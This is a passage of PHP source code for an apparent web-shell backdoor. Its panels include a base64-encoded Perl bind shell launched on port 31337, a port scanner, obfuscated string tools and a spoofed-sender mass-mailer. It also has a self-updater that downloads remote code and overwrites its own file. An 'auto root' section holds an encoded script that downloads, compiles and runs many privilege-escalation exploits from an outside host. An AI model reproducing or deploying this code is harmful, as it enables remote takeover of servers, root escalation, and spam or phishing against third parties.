    $bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
    if (!isset($bindport) || $bindport == null) {
        $bindport = "31337";
    }
    if (isset($startbind) && isset($bindport) && $bindport != null && $startbind != null) {
        cf("/tmp/bp.pl", $bind_port_p);
        $out  = wsoEx("perl /tmp/bp.pl " . $bindport . " 1>/dev/null 2>&1 &");
        $out2 = wsoEx("ps aux | grep bp.pl");
        unlink("/tmp/bp.pl");
        m("Now script binded to port " . $bindport . "...");
    }
    formhead(array(
        'title' => 'Bind Port'
    ));
    makehide('action', 'bindport');
    p('<p>');
    p('Port:');
    makeinput(array(
        'name' => 'bindport',
        'size' => 15,
        'value' => $bindport
    ));
    makeinput(array(
        'name' => 'startbind',
        'value' => 'Start',
        'type' => 'submit',
        'class' => 'bt'
    ));
    p('</p>');
    formfoot();
} elseif ($action == 'portscan') {
    !$scanip && $scanip = '127.0.0.1';
    !$scanport && $scanport = '21,25,80,110,135,139,445,1433,3306,3389,5631,43958';
    formhead(array(
        'title' => 'Port Scan'
    ));
    makehide('action', 'portscan');
    p('<p>');
    p('IP:');
    makeinput(array(
        'name' => 'scanip',
        'size' => 20,
        'value' => $scanip
    ));
    p('Port:');
    makeinput(array(
        'name' => 'scanport',
        'size' => 80,
        'value' => $scanport
    ));
    makeinput(array(
        'name' => 'startscan',
        'value' => 'Scan',
        'type' => 'submit',
        'class' => 'bt'
    ));
    p('</p>');
    formfoot();
    if ($startscan) {
        p('<h2>Result</h2>');
        p('<ul class="info">');
        $scanport = implode(",",list2array($scanport));
        foreach (array_unique(explode(',', $scanport),SORT_NUMERIC) as $port) {
            if($port < 0 || $port > 65535) continue;
            $fp = @fsockopen($scanip, $port, $errno, $errstr, 1);
            if (!$fp) {
                p('<li>' . $scanip . ':' . $port . ' ------------------------ <span style="font-weight:bold;color:#f00;">Closed</span></li>');
            } else {
                p('<li>' . $scanip . ':' . $port . ' ------------------------ <span style="font-weight:bold;color:#080;">Open</span></li>');
                @$pixel($fp);
            }
        }
        p('</ul>');
    }
} elseif ($action == 'stringtools') {
    if (!$sf('hex2bin')) {
        function hex2bin($p)
        {
            return decbin(hexdec($p));
        }
    }
    if (!$sf('hex2ascii')) {
        function hex2ascii($p)
        {
            $r = '';
            for ($i = 0; $i < strLen($p); $i += 2) {
                $r .= chr(hexdec($p[$i] . $p[$i + 1]));
            }
            return $r;
        }
    }
    if (!$sf('ascii2hex')) {
        function ascii2hex($p)
        {
            $r = '';
            for ($i = 0; $i < strlen($p); ++$i)
                $r .= dechex(ord($p[$i]));
            return strtoupper($r);
        }
    }
    if (!$sf('full_urlencode')) {
        function full_urlencode($p)
        {
            $r = '';
            for ($i = 0; $i < strlen($p); ++$i)
                $r .= '%' . dechex(ord($p[$i]));
            return strtoupper($r);
        }
    }
    formhead(array(
        'title' => 'String Conversions'
    ));
    echo '<div class=content>';
    $stringTools = array(
        'Base64 Encode' => strrev("edocne_4"."6esab"),
        'Base64 Decode' => strrev("edoced_4"."6esab"),
        'URL Encode' => 'urlencode',
        'URL Decode' => 'urldecode',
        'Full URL Encode' => 'full_urlencode',
        'MD5 hash' => 'md5',
        'SHA1 hash' => 'sha1',
        'CRYPT' => 'crypt',
        'CRC32' => 'crc32',
        'ASCII to HEX' => 'ascii2hex',
        'HEX to ASCII' => 'hex2ascii',
        'HEX to DEC' => 'hexdec',
        'HEX to BIN' => 'hex2bin',
        'DEC to HEX' => 'dechex',
        'DEC to BIN' => 'decbin',
        'BIN to HEX' => 'bin2hex',
        'BIN to DEC' => 'bindec',
        'String to lower case' => 'strtolower',
        'String to upper case' => 'strtoupper',
        'HtmlSpecialChars' => 'htmlspecialchars',
        'String Length' => 'strlen'
    );
    if (empty($ajax) && !empty($p1))
        $_SESSION[$prefixme . md5($_SERVER['HTTP_HOST']) . 'ajax'] = false;
    echo "<form name='toolsForm' method='post' onSubmit=\"window.onbeforeunload = null;\">";
    makehide('action', 'stringtools');
    echo "<select name='selectTool'>";
    foreach ($stringTools as $k => $v)
        echo "<option " . (isset($selectTool) && $v == $selectTool ? "selected " : "") . "value='" . htmlspecialchars($v) . "'>" . $k . "</option>";
    echo "</select><input type='submit' class='bt' value='Convert'/><br><textarea onmouseover='this.focus();' name='input' cols='100' rows='25' style='margin-top:5px'>" . $input . "</textarea></form><pre class='ml1' style='white-space:normal;" . (empty($selectTool) ? 'display:none;' : '') . "margin-top:5px' id='strOutput'>";
    if (!empty($selectTool)) {
        if ($sf($selectTool))
            echo htmlspecialchars($selectTool($input));
            if ($selectTool == "ascii2hex"){
                echo "<br>PHP String Hex:<br>\x" . implode(str_split($selectTool($input),2),"\x");
            }
    }
    echo "</pre></div>";
} elseif ($action == 'email') {
	formhead(array(
        'title' => 'Send Email'
    ));
    $randomizer = isset($randomfr) && $randomfr ? "1" : "0";
    $splitm     = isset($splitm) && $splitm ? "1" : "0";
    if ((!empty($to)) && (!empty($contents)) && ((!empty($email)) || $randomizer)) {
        for ($counter = 0; $counter < $times; $counter++) {
            if ($randomizer) {
                $email = generateRandomString(5) . "@" . generateRandomString(5) . ".com";
            }
            if ($rt == "") {
                $rt = $email;
            }
            $random_hash = md5(date('r', time()));
            $headers     = 'From: ' . $name . ' <' . $email . ">\r\n" . 'Reply-To: ' . $rt;
            $headers .= "\r\nMIME-Version: 1.0\r\n";
            if ($_FILES['file']['name'][0] != "") {
                $headers .= mailAttachmentHeader($contents);
                $contents = '';
                echo 'Sending with attachment...<br/>';
            }
            $oldphpself = $_SERVER['PHP_SELF'];
            $oldremoteaddr = $_SERVER['REMOTE_ADDR'];
            $_SERVER['PHP_SELF'] = "/";
            $_SERVER['REMOTE_ADDR'] = $_SERVER['SERVER_ADDR'];
            chdir("/");
            if ($splitm) {
                $messagez = str_split($message, $saf);
                foreach ($messagez as $spmessage) {
                    if (@mail($to, $subject, $spmessage, $headers)) { //'From: ' . $_POST["name"] . ' <' . $_POST["email"] . ">\r\n" . 'Reply-To: ' . $rt)){
                        echo "Email sent to " . htmlentities($to) . " from " . $email . "!<br/>";
                    } else {
                        echo "Email sending failed.<br/>";
                    }
                    usleep(100000);
                }
            } else {
                if (@mail($to, $subject, $message, $headers)) { //'From: ' . $_POST["name"] . ' <' . $_POST["email"] . ">\r\n" . 'Reply-To: ' . $rt)){
                    echo "Email sent to " . htmlentities($to) . " from " . $email . "!<br/>";
                } else {
                    echo "Email sending failed.<br/>";
                }
            }
            $_SERVER['PHP_SELF'] = $oldphpself;
            $_SERVER['REMOTE_ADDR'] = $oldremoteaddr;
            chdir($nowpath);
        }
    } else {
        echo '<script language="javascript">
function add() {
	var element = document.createElement("tr");
	element.innerHTML=\'<td></td><td><input type="file" name="file[]">\';
    var foo = document.getElementById("file");
    insertAfter(foo,element);
}
</script>
<script language="javascript">
function insertAfter(referenceNode, newNode) {
    referenceNode.parentNode.insertBefore(newNode, referenceNode.nextSibling);
}
</script>
<form method="post" enctype="multipart/form-data" onSubmit="window.onbeforeunload = null;">
<table width="100%">
	<tr>
	<td>To:</td>
	<td><input onmouseover="this.focus();" type="text" name="to"></td>
	</tr>
	<tr>
	<td>From Name:</td>
	<td><input onmouseover="this.focus();" type="text" name="name"></td>
	</tr>
	<tr>
	<td>From Email:</td>
	<td><input onmouseover="this.focus();" type="text" name="email"><input type="checkbox" value="1" name="randomfr" id="randomfr"><label for="randomfr" value="Randomize">Randomize</label></td>
	</tr>
	<tr>
	<td>Reply-To Email:</td>
	<td><input onmouseover="this.focus();" type="text" name="rt"></td>
	</tr>
	<tr id="file">
	<td>Attachment:</td>
	<td><input type="file" name="file[]"/><input type="button" onclick="add()" value="Add More"></td>
	</tr>
	<tr>
	<td>Subject:</td>
	<td><input onmouseover="this.focus();" type="text" name="subject"></td>
	</tr>
	<tr>
	<td>Message:</td>
	<td><textarea onmouseover="this.focus();" name="contents"></textarea></td>
	</tr>
	<tr>
	<td>Split Message:</td>
	<td><input type="checkbox" value="1" name="splitm" id="splitm"><label for="splitm" value="Split Message">Split Messages</label></td>
	</tr>
	<tr>
	<td>Characters per Message(If Split Message is checked):</td>
	<td><input type="number" onmouseover="this.focus();" name="saf" value="140"></td>
	</tr>
	<tr>
	<td>Send How Many Times:</td>
	<td><input type="number" onmouseover="this.focus();" min="1" value="1" name="times"></td>
	</tr>
	<tr>
	<td></td><td><input type="submit" class="bt" value="Send"></td>
	</tr>
	</table>';
        makehide("action", "email");
        echo '</form>';
    }
} elseif ($action == "checkupdates") {
	formhead(array(
        'title' => 'Check For Updates'
    ));
    if ($checkforupdates == true && $cforupurl != "") {
    	$_SESSION[$prefixme.'updateready'] = time() + 300;
        $parsed = parse_url($cforupurl);
        $query = isset($parsed['query']) ? $parsed['query'] : "";
        $baseurl = rtrim(str_replace($query, "", $cforupurl), "?");
        parse_str($query, $vars);
        if ($force == "true") {
    	    if ($helpsupportbooter == false){
    	        $cuuff = $cforupurl;
    	    }else{
    	        $add = array("u"=>("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI']));
    	        $cuuff = $baseurl . "?" . http_build_query(array_merge($vars, $add));
    	        }
        } else {
            $add = array("v"=>$version);
            if($helpsupportbooter != false) $add = array_merge($add, array("u"=>("http" . (empty($_SERVER['HTTPS']) ? "" : "s") . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'])));
            $cuuff = $baseurl . "?" . http_build_query(array_merge($vars, $add));
        }
        $res = file_get_contents($cuuff);
        if (!$res) {
            $res = get_data($cuuff);
        }
        if ($res != "") {
            $ourFileHandle = $pen($prg('@\(.*\(.*$@', '', __FILE__), "w");
            $feather($ourFileHandle,str_replace(strrev("EREHENILUFC"),'$checkforupdates    = '.strbool($checkforupdates).';',str_replace(strrev("EREHENILBSH"),'$helpsupportbooter  = '.strbool($helpsupportbooter).';',str_replace(strrev("EREHENILUUFC"),'$checkforupdatesurl = "'.$checkforupdatesurl.'";',str_replace(strrev("EREHENILPEA"),'$adaptiveerrorpage  = '.strbool($adaptiveerrorpage).';',str_replace(strrev("EREHENILDROWSSAP"),'$pass               = "'.$pass.'";',html_entity_decode($res)))))));
            $pixel($ourFileHandle);
    				unset($_SESSION[$prefixme.'showupdate']);
            echo "Shell updated! Refreshing in <span id='counter'>5</span> seconds...<meta http-equiv=\"refresh\" content=\"5\">" . '<script>window.onbeforeunload = null;function countdown(){var e=document.getElementById("counter");if(parseInt(e.innerHTML)>0){e.innerHTML=parseInt(e.innerHTML)-1}}setInterval(function(){countdown()},1e3)</script>';
        } else {
            echo "Shell is up to date! Thank you for checking!";
        }
        echo '<br/><form method="POST" onSubmit="window.onbeforeunload = null;"><input type="hidden" name="force" value="true"><input type="submit" value="Force Update">';
        makehide("action", "checkupdates");
        echo "</form>";
    } else {
        echo "Updating has been disabled or the check for update URL is empty... Please try again after fixing these problems.";
    }
} elseif ($action == 'aroot') {
	formhead(array(
        'title' => 'Auto Root Results'
    ));
    $r00t = "IyEvdXNyL2Jpbi9wZXJsIA0KIyBFeHBsb2l0IHRvb2xzIHYyLjAgY29kZWQgYnkgaXNrb3JwaXR4 IChUdXJraXNoIEhhY2tlcikNCiMgbGludXggc2VydmVybGVyZGUgZ2VjZXJsaWRpcg0KIyBpeWkg c2Fuc2xhcjopDQojIGJ5IGlza29ycGl0eA0KeyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvaXNrb3JwaXR4Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IGlza29ycGl0eCIpOyANCnN5c3RlbSgiLi9pc2tvcnBpdHgiKTsgDQpzeXN0ZW0oImlkIik7IA0K c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy80NCIpOyAg DQpzeXN0ZW0oImNobW9kIDc3NyA0NCIpOyANCnN5c3RlbSgiLi80NCIpOyANCnN5c3RlbSgiaWQi KTsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvOTUy MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyA5NTIxIik7IA0Kc3lzdGVtKCIuLzk1MjEiKTsgDQpz eXN0ZW0oImlkIik7ICANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvZnJvb3QiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZnJvb3QiKTsgDQpzeXN0ZW0o Ii4vZnJvb3QiKTsgDQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7 DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oImlkIik7DQpzeXN0ZW0oIndnZXQgMjc3MDQuYyBkb3du bG9hZHMuc2VjdXJpdHlmb2N1cy5jb20vdnVsbmVyYWJpbGl0aWVzL2V4cGxvaXRzLzI3NzA0LmMi KTsgDQpzeXN0ZW0oImdjYyAyNzcwNC5jIC1vIDI3NzA0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3 IDI3NzA0Iik7IA0Kc3lzdGVtKCIuLzI3NzA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJ ZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8v d2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvMTgtMS5jIik7IA0Kc3lzdGVtKCJnY2MgLVdh bGwgLW8gMTgtMSAxOC0xLmMiKTsgDQpzeXN0ZW0oImdjYyAtV2FsbCAtbTY0IC1vIDE4LTMgMTgt MS5jIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDE4 LTMiKTsgDQpzeXN0ZW0oIi4vMTgtMSIpOyANCnN5c3RlbSgiaWQiKTsgDQpzeXN0ZW0oIi4vMTgt MyIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBj dHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl L2NjLzE4LTIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgMTgtMiIpOyANCnN5c3RlbSgiLi8xOC0y Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0 cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUv Y2MvMTgtMSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAxOC0xIik7IA0Kc3lzdGVtKCIuLzE4LTEi KTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3Ry bCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9ydW4iKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVuIik7IA0Kc3lzdGVtKCIuL3J1biIpOyAN CnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2Nc biI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4 cGxvaXQuYyIpOyAgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 DQpzeXN0ZW0oIndnZXQgcnVuX2V4cGxvaXRzLnNoIHdnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NN U19GSUxFUy9maWxlL2NjL3J1bl9leHBsb2l0cy5zaCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBy dW5fZXhwbG9pdHMuc2giKTsgDQpzeXN0ZW0oIi4vcnVuX2V4cGxvaXRzLnNoIik7IA0KcHJpbnQg IklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6 Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGV4cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4 cCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwIik7ICANCnN5c3RlbSgi Y2htb2QgNzc3IGV4cCIpOyANCnN5c3RlbSgiLi9leHAiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lz dGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHAxIik7ICAN CnN5c3RlbSgiY2htb2QgNzc3IGV4cDEiKTsgDQpzeXN0ZW0oIi4vZXhwMSIpOyANCnN5c3RlbSgi aWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2Nj L2V4cDIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwMiIpOyANCnN5c3RlbSgiLi9leHAyIik7 IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJ TEVTL2ZpbGUvY2MvZXhwMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHAzIik7IA0Kc3lzdGVt KCIuL2V4cDMiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGV4cDQgaHR0cDovL3dh cjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3Nzcg ZXhwNCIpOyANCnN5c3RlbSgiLi9leHA0Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dl dCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwNSIpOyAgDQpzeXN0ZW0o ImNobW9kIDc3NyBleHA1Iik7IA0Kc3lzdGVtKCIuL2V4cDUiKTsgDQpzeXN0ZW0oImlkIik7IA0K c3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA2Iik7 ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4cDYiKTsgDQpzeXN0ZW0oIi4vZXhwNiIpOyANCnN5c3Rl bSgiaWQiKTsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxl L2NjL2V4cDciKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwNyIpOyANCnN5c3RlbSgiLi9leHA3 Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01T X0ZJTEVTL2ZpbGUvY2MvZXhwOCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBleHA4Iik7IA0Kc3lz dGVtKCIuL2V4cDgiKTsgDQpzeXN0ZW0oImlkIik7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHA5Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4 cDkiKTsgDQpzeXN0ZW0oIi4vZXhwOSIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5 NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL3J1bjIiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgcnVu MiIpOyANCnN5c3RlbSgiLi9ydW4yIik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIg cjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3 MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvcnVuMiIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBydW4y Iik7IA0Kc3lzdGVtKCIuL3J1bjIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciBy MDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcx LmNvbS9DTVNfRklMRVMvZmlsZS9jYy9leHBsb2l0Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IGV4 cGxvaXQiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAi SWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7DQpzeXN0ZW0oIndnZXQgaHR0cDov L3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4cGxvaXQyIik7ICANCnN5c3RlbSgiY2ht b2QgNzc3IGV4cGxvaXQyIik7IA0Kc3lzdGVtKCIuL2V4cGxvaXQyIik7IA0Kc3lzdGVtKCJpZCIp OyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgi d2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvZXhwbG9pdDIiKTsgIA0K c3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhwbG9pdDIiKTsgDQpz eXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4i Ow0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9ydW4y Iik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bjIiKTsgDQpzeXN0ZW0oIi4vcnVuMiIpOyANCnN5 c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7 DQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjLzIwMDkt MSIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAyMDA5LTEiKTsgDQpzeXN0ZW0oIi4vMjAwOS0xIik7 IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwr Y1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2Mv ZGVybGUuYyIpOyANCnN5c3RlbSgiZ2NjIGRlcmxlLmMgLW8gZGVybGUiKTsgIA0Kc3lzdGVtKCJj aG1vZCA3NzcgZGVybGUiKTsgDQpzeXN0ZW0oIi4vZGVybGUiKTsgDQpzeXN0ZW0oImlkIik7IA0K cHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtjXG4iOw0Kc3lzdGVtKCJ3Z2V0 IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8zLmMiKTsgDQpzeXN0ZW0oImdj YyAzLmMgLW8gMyIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyAzIik7IA0Kc3lzdGVtKCIuLzMiKTsg DQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdpdGggY3RybCtj XG4iOw0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy8z YSIpOyANCnN5c3RlbSgiY2htb2QgNzc3IDNhIik7IA0Kc3lzdGVtKCIuLzNhIik7IA0Kc3lzdGVt KCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xuIjsNCnN5 c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVTL2ZpbGUvY2MvNC5jIik7IA0K c3lzdGVtKCJnY2MgNC5jIC1vIDQiKTsgIA0Kc3lzdGVtKCJjaG1vZCA3NzcgNCIpOyANCnN5c3Rl bSgiLi80Iik7IA0Kc3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3 aXRoIGN0cmwrY1xuIjsNCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvNGEiKTsgDQpzeXN0ZW0oImNobW9kIDc3NyA0YSIpOyANCnN5c3RlbSgiLi80YSIp OyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSByIHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJs K2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIxOTcxLmNvbS9DTVNfRklMRVMvZmlsZS9j Yy9jeC5jIik7IA0Kc3lzdGVtKCJnY2MgY3guYyAtbyBjeCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3 NyBjeCIpOyANCnN5c3RlbSgiLi9jeCIpOyANCnN5c3RlbSgiaWQiKTsgDQpwcmludCAiSWYgdSBy IHIwMHQgc3RvcCB4cGwgd2l0aCBjdHJsK2NcbiI7IA0Kc3lzdGVtKCJ3Z2V0IGh0dHA6Ly93YXIx OTcxLmNvbS9DTVNfRklMRVMvZmlsZS9jYy9jeHguYyIpOyANCnN5c3RlbSgiZ2NjIGN4eC5jLSBv IGN4eCIpOyAgDQpzeXN0ZW0oImNobW9kIDc3NyBjeHgiKTsgDQpzeXN0ZW0oIi4vY3h4Iik7IA0K c3lzdGVtKCJpZCIpOyANCnByaW50ICJJZiB1IHIgcjAwdCBzdG9wIHhwbCB3aXRoIGN0cmwrY1xu IjsgDQpzeXN0ZW0oIndnZXQgaHR0cDovL3dhcjE5NzEuY29tL0NNU19GSUxFUy9maWxlL2NjL2V4 cGxvaXQyIik7IA0Kc3lzdGVtKCJjaG1vZCA3NzcgZXhwbG9pdDIiKTsgDQpzeXN0ZW0oIi4vZXhw bG9pdDIiKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBydW4gaHR0cDovL3dhcjE5NzEuY29tL0NNU19G SUxFUy9maWxlL2NjL3J1biIpOyANCnN5c3RlbSgiY2htb2QgNzc3IHJ1biIpOyANCnN5c3RlbSgi Li9ydW4iKTsgDQpzeXN0ZW0oImlkIik7IA0KcHJpbnQgIklmIHUgciByMDB0IHN0b3AgeHBsIHdp dGggY3RybCtjXG4iOyANCnN5c3RlbSgid2dldCBodHRwOi8vd2FyMTk3MS5jb20vQ01TX0ZJTEVT L2ZpbGUvY2MvcnVuLnNoIik7ICANCnN5c3RlbSgiY2htb2QgNzc3IHJ1bi5zaCIpOyANCnN5c3Rl 